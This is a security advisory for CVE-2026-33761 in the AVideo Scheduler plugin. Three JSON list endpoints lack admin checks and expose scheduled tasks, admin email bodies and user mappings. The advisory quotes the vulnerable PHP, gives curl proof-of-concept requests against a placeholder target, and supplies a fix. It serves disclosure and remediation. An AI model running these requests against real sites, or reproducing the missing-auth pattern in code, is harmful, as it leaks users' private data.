# [M] AVideo: Unauthenticated Access to Scheduler Plugin Endpoints Leaks Scheduled Tasks, Email Content, and User Mappings

## Summary
Severity: Medium
Advisory: GHSA-j724-5c6c-68g5
CVE: CVE-2026-33761
CWE: CWE-200, CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-03-26
Source: https://github.com/advisories/GHSA-j724-5c6c-68g5
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

Three `list.json.php` endpoints in the Scheduler plugin lack any authentication check, while every other endpoint in the same plugin directories (`add.json.php`, `delete.json.php`, `index.php`) requires `User::isAdmin()`. An unauthenticated attacker can retrieve all scheduled tasks (including internal callback URLs and parameters), admin-composed email messages, and user-to-email targeting mappings by sending simple GET requests.

## Details

The vulnerable files are:

**1. `plugin/Scheduler/View/Scheduler_commands/list.json.php:1-7`**
```php
<?php
require_once '../../../../videos/configuration.php';
require_once $global['systemRootPath'] . 'plugin/Scheduler/Objects/Scheduler_commands.php';
header('Content-Type: application/json');

$rows = Scheduler_commands::getAll();
?>
{"data": <?php echo json_encode($rows); ?>}
```

**2. `plugin/Scheduler/View/Emails_messages/list.json.php:1-10`**
```php
<?php
require_once '../../../../videos/configuration.php';
require_once $global['systemRootPath'] . 'plugin/Scheduler/Objects/Emails_messages.php';
header('Content-Type: application/json');

$rows = Emails_messages::getAll();
$total = Emails_messages::getTotal();
?>
{"data": <?php echo json_encode($rows); ?>, ...}
```

**3. `plugin/Scheduler/View/Email_to_user/list.json.php:1-10`**
```php
<?php
require_once '../../../../videos/configuration.php';
require_once $global['systemRootPath'] . 'plugin/Scheduler/Objects/Email_to_user.php';
header('Content-Type: application/json');

$rows = Email_to_user::getAll();
$total = Email_to_user::getTotal();
?>
{"data": <?php echo json_encode($rows); ?>, ...}
```

None of these files check authentication before calling `getAll()`, which executes `SELECT * FROM {table}` and returns the entire table contents.

In contrast, every sibling endpoint requires admin access. For example, `plugin/Scheduler/View/Scheduler_commands/add.json.php:12-15`:
```php
if(!User::isAdmin()){
    $obj->msg = "You cant do this";
    die(json_encode($obj));
}
```

The `Scheduler_commands` table (defined in `plugin/Scheduler/Objects/Scheduler_commands.php`) stores fields including `callbackURL` (internal server URLs with query parameters), `parameters` (JSON blobs containing user IDs and email configuration), `status`, `timezone`, and cron scheduling fields. The `Emails_messages` table stores `subject` and `message` (full HTML email bodies composed by admins). The `Email_to_user` table maps `users_id` to `emails_messages_id`, revealing which users are targeted by which email campaigns.

## PoC

```bash
# 1. Retrieve all scheduled tasks — exposes internal callbackURLs and parameters
curl -s 'https://target/plugin/Scheduler/View/Scheduler_commands/list.json.php' | jq '.data[] | {id, callbackURL, parameters, status, type}'

# 2. Retrieve all admin-composed email messages — exposes subject and HTML body
curl -s 'https://target/plugin/Scheduler/View/Emails_messages/list.json.php' | jq '.data[] | {id, subject, message}'

# 3. Retrieve user-to-email targeting mappings — reveals which users receive which emails
curl -s 'https://target/plugin/Scheduler/View/Email_to_user/list.json.php' | jq '.data[] | {users_id, emails_messages_id, sent_at}'
```

All three return full database contents with no authentication required. No session cookie or token is needed.

## Impact

An unauthenticated attacker can:

- **Enumerate internal infrastructure**: `callbackURL` fields expose internal server URLs and query parameters used by the scheduler, potentially revealing internal API endpoints and their parameter structures
- **Read admin email campaigns**: Full email subjects and HTML message bodies composed by administrators are exposed
- **Map user targeting**: The `Email_to_user` table reveals which `users_id` values are targeted by which email campaigns, enabling user enumeration and profiling
- **Gather reconnaissance**: Scheduling configuration (cron fields, execution status, timezone) reveals operational patterns and timing of automated tasks

The information disclosed could be used to facilitate further attacks (e.g., using discovered internal URLs for SSRF, or user IDs for targeted account attacks).

## Recommended Fix

Add `User::isAdmin()` checks to all three `list.json.php` files, matching the pattern used by sibling endpoints. For each file, add the following after the `require_once` lines and before the data retrieval:

**`plugin/Scheduler/View/Scheduler_commands/list.json.php`:**
```php
<?php
require_once '../../../../videos/configuration.php';
require_once $global['systemRootPath'] . 'plugin/Scheduler/Objects/Scheduler_commands.php';
header('Content-Type: application/json');

if(!User::isAdmin()){
    die(json_encode(['error' => true, 'msg' => 'Not authorized']));
}

$rows = Scheduler_commands::getAll();
?>
{"data": <?php echo json_encode($rows); ?>}
```

Apply the same pattern to `Emails_messages/list.json.php` and `Email_to_user/list.json.php`.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-j724-5c6c-68g5
- https://nvd.nist.gov/vuln/detail/CVE-2026-33761
- https://github.com/WWBN/AVideo/commit/83390ab1fa8dca2de3f8fa76116a126428405431
- https://github.com/WWBN/AVideo
